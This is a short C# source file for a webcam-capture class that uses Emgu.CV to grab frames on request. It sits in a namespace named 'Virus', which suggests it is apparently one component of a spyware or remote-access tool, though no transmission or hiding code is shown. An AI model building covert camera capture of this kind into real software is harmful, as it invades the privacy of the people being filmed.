using Emgu.CV;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Virus {

    public class Webcam {

        private VideoCapture capture;
        private bool requested = false;

        public Webcam() {
            
        }

        public void Update() {
            if(!requested) {
                Stop();
            } requested = false;
        }

        public void Start() {
            Logger.Log("START");
            if (this.capture != null) Stop();
            this.capture = new VideoCapture();
        }

        public void Stop() { 
            if (this.capture == null) return;
            Logger.Log("STOP");
            this.capture.Stop();
            this.capture.Dispose();
            this.capture = null;
        }

        public Bitmap GetImage() {
            this.requested = true;
            if (this.capture == null) Start();
            return this.capture.QuerySmallFrame().Bitmap;
        }
    }

}
